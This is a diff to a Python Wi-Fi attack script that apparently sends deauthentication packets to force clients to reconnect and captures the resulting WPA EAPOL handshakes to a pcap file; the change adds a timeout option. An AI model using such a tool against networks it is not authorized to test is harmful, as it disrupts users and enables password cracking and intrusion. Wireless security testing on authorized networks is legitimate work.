@@ -35,7 +35,7 @@ def check_monitor(iface):
         subprocess.call('ip link set %s down' % iface, shell=True)
         subprocess.call('iw dev %s set type monitor' % iface, shell=True)
         subprocess.call('ip link set %s up' % iface, shell=True)
-        if subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True).decode().strip()\
+        if subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True).decode().strip() \
                 != "monitor":
             print('Failed to set %s monitor mode. Exiting..' % iface)
             sys.exit()
@@ -76,17 +76,19 @@ def check_args():
     parser.add_argument('-C', '--channel', help='AP Channel, Default: None', type=int, required=True, dest='channel')
     parser.add_argument('-d', '--deauth', help='Number of Deauth packets to send, Default: 1', type=int, default='1',
                         dest='deauth_count')
-    parser.add_argument('-p', '--pcap',
-                        help='PCAP file to save EAPOL Packets Automatically Appended Current Time, Default: '
-                             'sniffed_date.pcap',
-                        default='sniffed.pcap', dest='pcap_file')
+    parser.add_argument('-t', '--timeout', help='Number of seconds to wait for handshake after deauth, Default: 5',
+                        type=int, default='5', dest='timeout')
+    parser.add_argument('-p', '--pcap', help='PCAP file to save EAPOL Packets Automatically Appended Current Time, '
+                                             'Default: sniffed_current_date.pcap', default='sniffed.pcap',
+                        dest='pcap_file')
     results = parser.parse_args()
-    return results.iface, results.ap, results.client, results.channel, results.deauth_count, results.pcap_file
+    return results.iface, results.ap, results.client, results.channel, results.deauth_count, results.timeout, \
+           results.pcap_file
 
 
 def sniffer():
     print(f"{bcolors.HEADER}[*] Running...{bcolors.ENDC}")
-    sniff(iface=iface, prn=packethandler, timeout=5)
+    sniff(iface=iface, prn=packethandler, timeout=timeout)
 
 
 def packethandler(pkt):
@@ -138,7 +140,7 @@ def dropbox_uploader():
 if __name__ == '__main__':
     is_root()
     print_banner()
-    iface, ap, client, channel, deauth_count, pcap_file = check_args()
+    iface, ap, client, channel, deauth_count, timeout, pcap_file = check_args()
     check_monitor(iface)
     pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'  # Add
     # current time in the middle of pcap file name
